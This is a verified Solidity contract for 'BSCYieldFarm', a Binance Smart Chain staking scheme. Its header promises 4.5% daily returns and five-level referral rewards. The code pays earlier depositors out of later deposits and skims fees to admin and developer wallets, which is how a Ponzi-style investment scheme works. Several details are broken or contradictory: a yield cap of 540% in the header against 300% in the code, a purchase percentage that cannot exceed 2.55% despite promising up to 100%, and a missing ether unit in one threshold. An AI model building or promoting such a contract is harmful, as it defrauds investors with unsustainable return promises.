/**
 *Submitted for verification at BscScan.com on 2023-01-08
*/

/**
 *Submitted for verification at BscScan.com on 2022-11-15
*/

/*   BSCYieldFarm - Community Experimental yield 
 *   Farm on Binance Smart Chain.
 *   The only official platform BSCyf project!
 *   Version 1.0.5
 *   SPDX-License-Identifier: Unlicensed
 *   ┌─────────────────────────────────────────┐
 *   │   Website: https://bscyf.com            │
 *   │                                         │
 *   │   Telegram Live Support: @bsctrecks     │
 *   │   Telegram Public Chat: @bscyf_real     │
 *   │                                         │
 *   │   E-mail: [email protected]              │
 *   └───────────────────────-─────────────────┘
 *
 *   [USAGE INSTRUCTION]
 *
 *   1) Connect any supported wallet [Recommended: Metamask/TrustWallet ]
 *   2) Be sure to switch to BSC network (Binance Smart Chain) 
 *   3) Click on Dashboard to view the Staking Options
 *   4) Enter the BNB or BSC token amount (e.g: 100)
 *   5) Click "Stake BNB/BUSD/CYFT", and confirm the transaction
 *   6) Wait for your earnings, it starts as soon as the transaction is confirmed and Yields every seconds
 *   7) Once you have sufficient Yields, Click on "Harvest Asset" any time (@ 24 hours Intervals)
 *   8) We aim to build a strong community through team work, pls share your link and earn more...
 *   
 *   ##### NOTICE: 
 *   We have a smart Antiy-Drain system implemented to ensure system longevity
 *
 *   [STAKING/FARMING TERMS]
 *
 *   - Minimum deposit: 0.2 BNB [or as specified on the DApp], no maximum limit
 *   - Total income: based on your Staking Contract (4.5% daily) 
 *   - Yields every seconds, harvest any time (@ 24 hours Intervals)
 *   - Yield Cap 540% 
 *
 *   [AFFILIATE PROGRAM]
 *
 *   - 5 level referral reward: 5% - 3% - 2% - 1.5% - 0.5%
 *
 *   [FUNDS DISTRIBUTION]
 *
 *   - 85% Platform main balance, using for participants payouts, affiliate program bonuses
 *   - 15% Advertising and promotion expenses, Support work, technical functioning, administration fee
 *
 *   [DISCLAIMER]
 *
 *   This is an experimental project, it's success relies on its community
 *   as DeFi system it runs smoothly on binance smartchain network
 *   This project can be considered having high risks as well as high profits.
 *   Though once contract balance drops to zero payments will stops, everything has been 
 *   programmed to prevent this from happening, therefore as we keep sharing this project it will remain alive.
 *   STAKE/DEPOSIT AT YOUR OWN RISK.
 */

pragma solidity 0.8.17;

contract ReentrancyGuard {
    // Booleans are more expensive than uint256 or any type that takes up a full
    // word because each write operation emits an extra SLOAD to first read the
    // slot's contents, replace the bits taken up by the boolean, and then write
    // back. This is the compiler's defense against contract upgrades and
    // pointer aliasing, and it cannot be disabled.

    // The values being non-zero value makes deployment a bit more expensive,
    // but in exchange the refund on every call to nonReentrant will be lower in
    // amount. Since refunds are capped to a percentage of the total
    // transaction's gas, it is best to keep them low in cases like this one, to
    // increase the likelihood of the full refund coming into effect.
    uint256 private constant _NOT_ENTERED = 1;
    uint256 private constant _ENTERED = 2;

    uint256 private _status;

    constructor () {
        _status = _NOT_ENTERED;
    }

    /**
    * @dev Prevents a contract from calling itself, directly or indirectly.
    * Calling a `nonReentrant` function from another `nonReentrant`
    * function is not supported. It is possible to prevent this from happening
    * by making the `nonReentrant` function external, and make it call a
    * `private` function that does the actual work.
    */
    modifier nonReentrant() {
        // On the first call to nonReentrant, _notEntered will be true
        require(_status != _ENTERED, "ReentrancyGuard: reentrant call");

        // Any calls to nonReentrant after this point will fail
        _status = _ENTERED;

        _;

        // By storing the original value once again, a refund is triggered (see
        // https://eips.ethereum.org/EIPS/eip-2200)
        _status = _NOT_ENTERED;
    }

    modifier isHuman() {
        require(tx.origin == msg.sender, "sorry humans only");
        _;
    }
}

contract PriceConsumerV3 {

    AggregatorV3Interface internal priceFeed;

    /**
    * Network: Binance Smart Chain
    * Aggregator: BNB/USD
    * Address: 0x0567F2323251f0Aab15c8dFb1967E4e8A7D42aeE // live
    */
    constructor() {
        priceFeed = AggregatorV3Interface(0x0567F2323251f0Aab15c8dFb1967E4e8A7D42aeE); // mainnet
    }

    /**
    * Returns the latest price
    */
    function getLatestPrice() internal view returns (int, uint8) {
        (,int price,,,) = priceFeed.latestRoundData();
        (uint8 decimals_) = priceFeed.decimals();
        return (price, decimals_);
    }
}

contract BSCYieldFarm is ReentrancyGuard, PriceConsumerV3{
    using SafeERC20 for IERC20;
    // Staking PARAMETERS for BSCYieldFarm;
    uint256 constant internal STAKE_MIN_AMOUNT = 0.01 ether;
    uint256 constant internal STAKE_MAX_AMOUNT = 100 ether;
    uint256 constant internal COMM = 1200;
    uint256[] internal REFERRAL_PERCENTS = [500, 300, 200, 150, 50];
    uint256 constant internal BUSNS_FEE = 1000;
    uint256 constant internal DEVLP_FEE = 500;
    uint256 constant internal MAKTN_FEE = 200;
    uint256 constant internal MTNCE_FEE = 150;
    uint256 constant internal PERCENTS_DIVIDER = 10000;
    uint256 constant internal TIME_STEP = 1 days; 
    uint256 constant internal ANTIWHALES = 3; // 300% max withdrawal - must reinvest afterward 
    uint256 constant internal DAILY_PERCENT = 450;
    uint256 constant internal CONTRACT_TIME = 90; // 90 DAYS
    uint256 constant internal HARVEST_FEE = 2500; // 90 DAYS
    uint256 constant internal SUBHARV_FEE = 50; // 90 DAYS
    uint256 constant internal EZYHARV_FEE = 20; // days for min fee
    address internal admin_;
    address internal marke_;
    address internal mtnce_;
    address internal devlp_;

    // Group stakes to avoid large loop
    struct Farming{
        uint256 total; // Total Staked
        uint256 active; // updates on each stake
        uint256 harvest; // pending to withdraw [updates on stake]
        uint256 bonus;
        uint256 totalBonus;
        uint256 harvested; // updates on stake
        uint256 tharvested; // updates on harvest
        uint256 start; // updates on each stake
        uint256 checkpoint;
    }

    struct Tokens{
        string tokenTicker;
        uint8 decimals;
        address token;
        uint256 stakeMinAmount;
        uint256 stakeMaxAmount;
        uint256 totalStaked;
        uint256 totalHarvest;
        uint256 totalRefBonus;
        uint256 totalFarmers;
    }

    struct Deposits {
        uint256 amount;
        uint256 start;
    }

    struct User {
        address referrer;
        uint256 pendingFunds;
        uint256 lastHarvest;
        address[] referrals;
        uint256[5] levels; 
    }

    mapping (address => uint256) public _tokensPurchased;

    mapping (address => User) public users;

    mapping(uint256 => Tokens) public tokens;

    mapping(address => mapping(uint256 => Deposits[])) public deposits;

    mapping(address => mapping(uint256 => Farming)) public myStakes;

    uint8 internal _lastTokenID = 0; 

    IUniswapV2Router02 public immutable uniswapV2Router;

    IERC20 internal immutable _busdAddress = IERC20(0xe9e7CEA3DedcA5984780Bafc599bD69ADd087D56);
        
    bool private inSwapAndLiquify;

    event Newbie(address user, uint256 tokenID);
    event NewDeposit(address indexed user, uint256 tokenID, uint256 amount);
    event Harvested(address indexed user, uint256 amount, uint256 tokenID);
    event Compounded(address indexed user, uint256 amount, uint256 tokenID);
    event RefBonus(address indexed referrer, address indexed referral, uint256 indexed level, uint256 amount);
    event FeePayed(address indexed user, uint256 totalAmount);

    constructor(address _admin, address _marketing, address _maintenance) {
        devlp_ = msg.sender;
        admin_ = _admin;
        marke_ = _marketing;
        mtnce_ = _maintenance;
        Tokens storage token = tokens[_lastTokenID];
        token.decimals = 18;
        token.tokenTicker = 'BNB';
        token.stakeMinAmount = STAKE_MIN_AMOUNT;
        token.stakeMaxAmount = STAKE_MAX_AMOUNT;
        _lastTokenID++;
        IUniswapV2Router02 _uniswapV2Router = IUniswapV2Router02(0x10ED43C718714eb63d5aA57B78B54704E256024E); 
        // test 0x9Ac64Cc6e4415144C455BD8E4837Fea55603e5c3 // live 0x10ED43C718714eb63d5aA57B78B54704E256024E
        uniswapV2Router = _uniswapV2Router;
    }

    modifier onlyDev(){
        require(msg.sender == devlp_);
        _;
    }

    modifier lockTheSwap {
        inSwapAndLiquify = true;
        _;
        inSwapAndLiquify = false;
    }

    // Insert Stake
    function insertStaking(uint256 _amount, uint256 _tokenID) internal{
        address _userID = msg.sender;
        Tokens storage token = tokens[_tokenID];
        if (deposits[_userID][_tokenID].length == 0) {
            myStakes[_userID][_tokenID].checkpoint = block.timestamp;
            myStakes[_userID][_tokenID].start = block.timestamp;
            token.totalFarmers++;
            emit Newbie(_userID, _tokenID);
        }

        deposits[_userID][_tokenID].push(Deposits(_amount, block.timestamp));

        Farming storage _mystakes = myStakes[_userID][_tokenID];

        (uint256 _subActive, uint256 _dividend) = getUDividend(_userID, _tokenID);
        _mystakes.total += _amount;
        _mystakes.active += _amount - _subActive;
        _mystakes.harvest += _dividend;
        _mystakes.harvested = 0;
        _mystakes.start = block.timestamp;
        _mystakes.checkpoint = block.timestamp;

        token.totalStaked += _amount;

        emit NewDeposit(_userID, _tokenID, _amount);
    }

    function registerUser(address _referrer, uint256 _tokenID) internal{
        address _userID = msg.sender;
        User storage user = users[_userID];
        // if (deposits[referrer][token.token].length > 0 && referrer != _userID) {
        if (_referrer == _userID || _referrer == address(0) || myStakes[_referrer][_tokenID].total == 0) {
            _referrer = devlp_;
        }
        user.referrer = _referrer;
        users[_referrer].referrals.push(_userID);
        // update count
        for(uint8 i = 0; i < 5; i++){
            if(_referrer != address(0)){
                users[_referrer].levels[i]++;
                _referrer = users[_referrer].referrer;
            }
            else break;
        }
    }

    function doStaking(address referrer, uint256 _amount, uint8 _tokenID) internal{
        address _userID = msg.sender;
        if(users[msg.sender].referrer == address(0)){
            registerUser(referrer, _tokenID);
        }
        Tokens storage token = tokens[_tokenID];
        uint256 _comm = _amount * COMM / PERCENTS_DIVIDER;
        address upline = users[_userID].referrer;
        for (uint256 i = 0; i < 5; i++) {
            if (upline != address(0)) {
                uint256 limit = users[upline].referrals.length;
                if(limit >= i){
                    uint256 amount = _amount * REFERRAL_PERCENTS[i] / PERCENTS_DIVIDER;
                    myStakes[upline][_tokenID].bonus += amount;
                    myStakes[upline][_tokenID].totalBonus += amount;
                    token.totalRefBonus += amount;
                    _comm = _comm - amount;
                    emit RefBonus(upline, _userID, i, amount);
                }
                
                upline = users[upline].referrer;
            } else break;
        }

        if(_comm > 0){
            myStakes[devlp_][_tokenID].bonus += _comm;
            myStakes[devlp_][_tokenID].totalBonus += _comm;
            token.totalRefBonus += _comm;
        }

        insertStaking(_amount, _tokenID);
    }

    function stakeBNB(address referrer) public payable {
        uint256 _amount = msg.value;
        address _userID = msg.sender;
        require(!isContract(_userID), 'NotAllowed');

        require(_amount >= tokens[0].stakeMinAmount && _amount <= tokens[0].stakeMaxAmount);

        uint256 _admnfee = _amount * BUSNS_FEE / PERCENTS_DIVIDER;
        uint256 _mkrtfee = _amount * MAKTN_FEE / PERCENTS_DIVIDER;
        uint256 _mtncfee = _amount * MTNCE_FEE / PERCENTS_DIVIDER;
        uint256 _dvlpfee = _amount * DEVLP_FEE / PERCENTS_DIVIDER;
        payable(admin_).transfer(_admnfee);
        payable(marke_).transfer(_mkrtfee);
        payable(mtnce_).transfer(_mtncfee);
        payable(devlp_).transfer(_dvlpfee);
        emit FeePayed(_userID, (_admnfee + _mkrtfee + _dvlpfee));
        doStaking(referrer, _amount, 0);
        uint256 _contractBalanceBUSD = _busdAddress.balanceOf(address(this));
        if(_contractBalanceBUSD > 0 && !inSwapAndLiquify){
            swapAndLiquify(_contractBalanceBUSD);
        }
    }

    function stakeToken(address referrer, uint8 tokenID, uint256 _amount) public {

        require(tokenID != 0 && tokens[tokenID].token != address(0), 'Wrong TokenID');
        
        address _userID = msg.sender;

        require(!isContract(_userID), 'NotAllowed');
        
        IERC20 salt = IERC20(tokens[tokenID].token);

        require(_amount >= tokens[tokenID].stakeMinAmount);

        require(_amount <= salt.allowance(msg.sender, address(this)));
        salt.safeTransferFrom(msg.sender, address(this), _amount);

        uint256 _admnfee = _amount * BUSNS_FEE / PERCENTS_DIVIDER;
        uint256 _mkrtfee = _amount * MAKTN_FEE / PERCENTS_DIVIDER;
        uint256 _dvlpfee = _amount * DEVLP_FEE / PERCENTS_DIVIDER;
        // tdeposits[devlp_][token.token].bonus.add(_fee);
        salt.safeTransfer(admin_, _admnfee);
        salt.safeTransfer(marke_, _mkrtfee);
        salt.safeTransfer(devlp_, _dvlpfee);
        emit FeePayed(_userID, (_admnfee + _mkrtfee + _dvlpfee));

        doStaking(referrer, _amount, tokenID);
    }

    function getContractBalance(uint256 tokenID) public view returns (uint256) {
        if(tokenID > 0){
            Tokens memory token = tokens[tokenID];
            IERC20 salt = IERC20(token.token);
            return salt.balanceOf(address(this));
        }
        else{
            return address(this).balance;
        }
    }

    function getUserTotalHarvested(address userAddress, uint256 _tokenID) internal view returns (uint256) {
        return myStakes[userAddress][_tokenID].tharvested;
    }

    function getUDividend(address _userID, uint256 _tokenID) public view returns(uint256, uint256){
        uint256 _share = 0;
        uint256 _dividend = 0;
        uint256 _end = myStakes[_userID][_tokenID].start + CONTRACT_TIME * TIME_STEP;
        if(myStakes[_userID][_tokenID].checkpoint < _end){
            _share = myStakes[_userID][_tokenID].active * DAILY_PERCENT / PERCENTS_DIVIDER;
            uint256 _from = myStakes[_userID][_tokenID].start > myStakes[_userID][_tokenID].checkpoint ? myStakes[_userID][_tokenID].start : myStakes[_userID][_tokenID].checkpoint;
            uint256 _to = _end < block.timestamp ? _end : block.timestamp;
            if(_from < _to){
                _dividend = _share * (_to - _from) / TIME_STEP;
            }
        }
        uint256 _subActive;
        uint256 _harvested = _dividend + myStakes[_userID][_tokenID].harvested;

        uint256 _active = myStakes[_userID][_tokenID].active;
        uint256 _incrment = CONTRACT_TIME * DAILY_PERCENT;
        // Get Total Expected
        if(_active > 0){
            uint256 _expected = _active * _incrment / PERCENTS_DIVIDER;
            uint256 _percent = _harvested * PERCENTS_DIVIDER / _expected;
            // get total Earned
            _subActive = _active * _percent / PERCENTS_DIVIDER;
        }

        return(_subActive, _dividend);
    }

    function getTotalAmount(uint256 _tokenID) private returns(uint256){
        address _userID = msg.sender;
        // Havest is allowed at intervals of 24hrs
        require(block.timestamp >= myStakes[_userID][_tokenID].checkpoint + TIME_STEP);
        uint256 totalAmount;
        (, uint256 _dividend) = getUDividend(_userID, _tokenID);
        if(_dividend > 0){
            myStakes[_userID][_tokenID].harvested +=  _dividend;
            totalAmount += _dividend;
        }

        uint256 pendingHarvest = myStakes[_userID][_tokenID].harvest;
        if (pendingHarvest > 0) {
            myStakes[_userID][_tokenID].harvest = 0;
            myStakes[_userID][_tokenID].harvested += pendingHarvest;
            totalAmount += pendingHarvest;
        }

        uint256 pendingFunds = users[_userID].pendingFunds;
        if (pendingFunds > 0) {
            users[_userID].pendingFunds = 0;
            totalAmount += pendingFunds;
        }

        uint256 referralBonus = myStakes[_userID][_tokenID].bonus;
        if (referralBonus > 0) {
            myStakes[_userID][_tokenID].bonus = 0;
            totalAmount += referralBonus;
        }

        // cap withdrawal to 3x total staked
        uint256 harvestCap = myStakes[_userID][_tokenID].total * ANTIWHALES;
        uint256 tHarvested = getUserTotalHarvested(_userID, _tokenID) + totalAmount;

        if(tHarvested >= harvestCap){
            uint256 subHarvest = tHarvested - harvestCap;
            totalAmount -= subHarvest;
            users[_userID].pendingFunds = subHarvest;
        }

        return totalAmount;
    }

    function harvest(uint256 _tokenID) public {
        
        uint256 totalAmount = getTotalAmount(_tokenID);
        
        require(totalAmount > 0);

        address _userID = msg.sender;
        
        require(!isContract(_userID), 'NotAllowed');

        Tokens storage token = tokens[_tokenID];
        
        uint256 _contractBalanceBUSD = _busdAddress.balanceOf(address(this));
        
        if(_contractBalanceBUSD > 0 && !inSwapAndLiquify){
            swapAndLiquify(_contractBalanceBUSD);
        } 

        uint256 contractBalance = address(this).balance;
        IERC20 salt;
        if(_tokenID != 0){
            salt = IERC20(token.token);
            contractBalance = salt.balanceOf(address(this));
        }

        uint256 _lastHarvest = users[_userID].lastHarvest;

        uint256 _harvestFee = HARVEST_FEE;

        uint256 _daysPassed = (block.timestamp - _lastHarvest) / TIME_STEP >= EZYHARV_FEE ? EZYHARV_FEE : (block.timestamp - _lastHarvest) / TIME_STEP;
        
        _harvestFee -= SUBHARV_FEE * _daysPassed;
        
        uint256 _withFee = totalAmount * _harvestFee / PERCENTS_DIVIDER;
        uint256 _withdrawn = totalAmount - _withFee;

        require(contractBalance >= _withdrawn * 4, 'AntyWhaleIsActive!');
        
        users[_userID].lastHarvest = block.timestamp;
        myStakes[_userID][_tokenID].checkpoint = block.timestamp;
        myStakes[_userID][_tokenID].tharvested += totalAmount;

        if(_tokenID != 0){
            salt.safeTransfer(msg.sender, _withdrawn);
        }
        else{
            payable(msg.sender).transfer(_withdrawn);
        }
        
        token.totalHarvest += totalAmount;

        emit Harvested(msg.sender, totalAmount, _tokenID); 
    }

    function manualCompounding(uint256 _tokenID) public{

        address _userID = msg.sender;
        Tokens storage token = tokens[_tokenID];
        
        uint256 totalAmount = getTotalAmount(_tokenID);

        require(totalAmount > 0);

        myStakes[_userID][_tokenID].checkpoint = block.timestamp;
        myStakes[_userID][_tokenID].tharvested += totalAmount;
        token.totalHarvest += totalAmount;

        // Make User's re-entry with 95% available.
        uint256 _compound = totalAmount * 9500 / PERCENTS_DIVIDER;
        if(_compound > 0){
            insertStaking(_compound, _tokenID);
            emit Compounded(msg.sender, _compound, _tokenID);
        }
            
    }

    function getUserDownlineCount(address userAddress) public view returns(uint256[5] memory referrals) {
        return users[userAddress].levels;
    }

    function getUserTotalReferrals(address userAddress) public view returns(uint256) {
        return users[userAddress].referrals.length;
    }

    function getUserReferralBonus(address userAddress, uint256 _tokenID) public view returns(uint256) {
        return myStakes[userAddress][_tokenID].bonus;
    }

    function getUserReferralTotalBonus(address userAddress, uint256 _tokenID) public view returns(uint256) {
        return myStakes[userAddress][_tokenID].totalBonus;
    }

    function getUserReferralHarvested(address userAddress, uint256 _tokenID) public view returns(uint256) {
        return myStakes[userAddress][_tokenID].totalBonus - myStakes[userAddress][_tokenID].bonus;
    }

    function getUserPendingHarvest(address userAddress, uint256 _tokenID) public view returns(uint256) {
        (, uint256 _dividend) = getUDividend(userAddress, _tokenID);
        return myStakes[userAddress][_tokenID].bonus + _dividend + users[userAddress].pendingFunds;
    }

    function getUserDepositInfo(address userAddress, uint256 index, uint256 _tokenID) public view returns(uint256 amount, uint256 start, uint256 finish) {
        amount = deposits[userAddress][_tokenID][index].amount;
        start = deposits[userAddress][_tokenID][index].start;
        finish = deposits[userAddress][_tokenID][index].start + CONTRACT_TIME * TIME_STEP;
    }

    function getUserInfo(address userAddress, uint8 _tokenID) public view returns(uint256 totalDeposit, uint256 totalHarvested, uint256 totalReferrals) {
        return(myStakes[userAddress][_tokenID].total, getUserTotalHarvested(userAddress, _tokenID), getUserTotalReferrals(userAddress));
    }

    function verifyAllowance(uint8 tokenID) public view returns(uint256){
        require(tokenID > 0);
        Tokens memory token = tokens[tokenID];
        return(IERC20(token.token).allowance(msg.sender, address(this)));
    }

    function addToken(address _token, uint256 _stakeMinAmount) public onlyDev{
        require(tokens[_lastTokenID].token == address(0));
        Tokens storage token = tokens[_lastTokenID];
        token.decimals = IERC20(_token).decimals();
        token.tokenTicker = IERC20(_token).symbol();
        token.token = _token;
        token.stakeMinAmount = _stakeMinAmount;
        _lastTokenID++;
    }

    function testPair(address _tokenA, address _tokenB, uint _amountIn) private view returns(uint[] memory amounts){
        address[] memory path = new address[](2);
        path[0] = _tokenA;
        path[1] = _tokenB;
        amounts = uniswapV2Router.getAmountsOut(_amountIn, path);
        return amounts;
    }

    // New Feature Added to Secure CYF token on Minter
    // Pay 5% to Sponsor on external purchase
    // Participate in CYF token 
    function checkBonusMultiplier() internal view returns(uint256 _multiplier){
        (uint256 _totalStaked, , ) = getUserInfo(msg.sender, 0);
        if(_totalStaked >= 1 ether && _totalStaked < 5 ether){
            _multiplier = 11500;
        }
        else if(_totalStaked >= 5 ether && _totalStaked < 25 ether){
            _multiplier = 13000;
        }
        else if(_totalStaked >= 25 ether && _totalStaked < 100 ether){
            _multiplier = 14500;
        }
        else if(_totalStaked >= 100 ether && _totalStaked < 300 ether){
            _multiplier = 16000;
        }
        else if(_totalStaked >= 300){
            _multiplier = 17500;
        }
        else{
            _multiplier = 10500;
        }
        return _multiplier;
    }

    function allocateToken(uint256 _amount) private{    
        address _userID = msg.sender;
        Tokens memory token = tokens[1];
        uint256 _usdValue = getUSDvalueFromBNB(_amount);
        uint[] memory _estimates = testPair(address(_busdAddress), address(token.token), _usdValue);
        uint256 _tokenAmount = (_estimates[1] * checkBonusMultiplier()) / PERCENTS_DIVIDER;
        // Set Tokens for User [Claimable on Claiming Contract]
        _tokensPurchased[_userID] += _tokenAmount; 
    }

    // Purchase with Stakes [1% to 100%] of active stake
    function purchaseWithActiveStakes(uint8 _allocation, bool _includeAvailable) public{     
        address _userID = msg.sender;
        // Take the same % on each packs 
        uint256 totalAmount;
        // Collect stake percentage
        // Update the available active amount.
        (uint256 _subActive, uint256 _dividend) = getUDividend(_userID, 0);
        uint256 _active = myStakes[_userID][0].active - _subActive;
        uint256 _allocated = _active * _allocation / PERCENTS_DIVIDER;
        myStakes[_userID][0].active -= _allocated + _subActive;
        
        myStakes[_userID][0].harvest += _dividend;
        myStakes[_userID][0].harvested = 0;
        
        if(_includeAvailable){
            uint256 pendinHarvest = myStakes[_userID][0].harvest;
            if(pendinHarvest > 0){
                myStakes[_userID][0].harvest = 0;
                totalAmount += pendinHarvest;

                myStakes[_userID][0].tharvested += pendinHarvest;
            }

            uint256 referralBonus = myStakes[_userID][0].bonus;
            if (referralBonus > 0) {
                myStakes[_userID][0].bonus = 0;
                totalAmount += referralBonus;

                myStakes[_userID][0].tharvested += referralBonus;
            }
        }
        myStakes[_userID][0].checkpoint = block.timestamp;
        totalAmount += _allocated;
        allocateToken(totalAmount);
    }

    // Purchase with available to harvest = [harvest and buy token]
    function purchaseWithAvailable() public{        
        address _userID = msg.sender;
        // Purchase with Available to Harvest
        // Harvest and Purchase
        // No commissions paid when using this method 
        require(block.timestamp >= myStakes[_userID][0].checkpoint + TIME_STEP);
        // uint256 totalAmount = getUserDividends(_userID, tokenID);
        uint256 totalAmount;
        // New Optimized for ease in withdrawal [Loop through the 5 staking plans]

        uint256 pendinHarvest = myStakes[_userID][0].harvest;

        if(pendinHarvest > 0){
            myStakes[_userID][0].harvest = 0;
            totalAmount += pendinHarvest;
        }

        (, uint256 _dividend) = getUDividend(_userID, 0);
        if(_dividend > 0){
            myStakes[_userID][0].harvested += _dividend;
            myStakes[_userID][0].checkpoint = block.timestamp;
            totalAmount += _dividend;
        }

        uint256 referralBonus = myStakes[_userID][0].bonus;
        if (referralBonus > 0) {
            myStakes[_userID][0].bonus = 0;
            totalAmount += referralBonus;
        }

        myStakes[_userID][0].checkpoint = block.timestamp;
        myStakes[_userID][0].tharvested += totalAmount;

        tokens[0].totalHarvest += totalAmount;

        // credit Tokens to User
        allocateToken(totalAmount);
    }

    // swap available usd to bnb
    function swapAndLiquify(uint256 tokenAmount) private lockTheSwap{
        _busdAddress.approve(address(uniswapV2Router), tokenAmount);
        // generate the uniswap pair path of token -> weth
        address[] memory path = new address[](2);
        path[0] = address(_busdAddress);
        path[1] = uniswapV2Router.WETH();
        // path[1] = uniswapV2Router.WETH();
        // make the swap
        uniswapV2Router.swapExactTokensForETHSupportingFeeOnTransferTokens(
            tokenAmount,
            0, // accept any amount of ETH
            path,
            address(this),
            block.timestamp
        );
    }

    function isContract(address addr) private view returns (bool) {
        uint256 size;
        assembly { size := extcodesize(addr) }
        return size > 0;
    }

    // to account for volume and bonuses
    function getUSDvalueFromBNB(uint256 _amount) private view returns(uint256 _bsudValue){
        (int bnbPrice, uint8 decimals_) = getLatestPrice(); // 1BNB in USD
        _bsudValue = (_amount * uint256(bnbPrice)) / 10 ** decimals_;
    }

    receive() external payable {}
}

interface IERC20 {
    function totalSupply() external view returns (uint256);
    function balanceOf(address account) external view returns (uint256);
    function transfer(address recipient, uint256 amount) external returns (bool);
    function allowance(address owner, address spender) external view returns (uint256);
    function approve(address spender, uint256 amount) external returns (bool);
    function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);
    function symbol() external view returns (string memory);
    function decimals() external view returns (uint8);
    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(address indexed owner, address indexed spender, uint256 value);
}

library SafeERC20 {

    function safeTransfer(IERC20 token, address to, uint256 value) internal {
        callOptionalReturn(token, abi.encodeWithSelector(token.transfer.selector, to, value));
    }

    function safeTransferFrom(IERC20 token, address from, address to, uint256 value) internal {
        callOptionalReturn(token, abi.encodeWithSelector(token.transferFrom.selector, from, to, value));
    }

    function safeApprove(IERC20 token, address spender, uint256 value) internal {
        require((value == 0) || (token.allowance(address(this), spender) == 0),
            "SafeERC20: approve from non-zero to non-zero allowance"
        );
        callOptionalReturn(token, abi.encodeWithSelector(token.approve.selector, spender, value));
    }
    function callOptionalReturn(IERC20 token, bytes memory data) private {
        require(isContract(address(token)), "SafeERC20: call to non-contract");

        // solhint-disable-next-line avoid-low-level-calls
        (bool success, bytes memory returndata) = address(token).call(data);
        require(success, "SafeERC20: low-level call failed");

        if (returndata.length > 0) { // Return data is optional
            // solhint-disable-next-line max-line-length
            require(abi.decode(returndata, (bool)), "SafeERC20: ERC20 operation did not succeed");
        }
    }

    function isContract(address addr) internal view returns (bool) {
        uint256 size;
        assembly { size := extcodesize(addr) }
        return size > 0;
    }
}

interface IUniswapV2Router01 {
    function WETH() external pure returns (address);
    function getAmountsOut(uint amountIn, address[] calldata path) external view returns (uint[] memory amounts);
}

interface IUniswapV2Router02 is IUniswapV2Router01 {
    function swapExactTokensForETHSupportingFeeOnTransferTokens(
        uint amountIn,
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external;
}

interface AggregatorV3Interface {

    function decimals()
        external
        view
        returns (
        uint8
        );

    function description()
        external
        view
        returns (
        string memory
        );

    function version()
        external
        view
        returns (
        uint256
        );

    // getRoundData and latestRoundData should both raise "No data present"
    // if they do not have data to report, instead of returning unset values
    // which could be misinterpreted as actual reported values.
    function getRoundData(
        uint80 _roundId
    )
        external
        view
        returns (
        uint80 roundId,
        int256 answer,
        uint256 startedAt,
        uint256 updatedAt,
        uint80 answeredInRound
        );

    function latestRoundData()
        external
        view
        returns (
        uint80 roundId,
        int256 answer,
        uint256 startedAt,
        uint256 updatedAt,
        uint80 answeredInRound
        );
}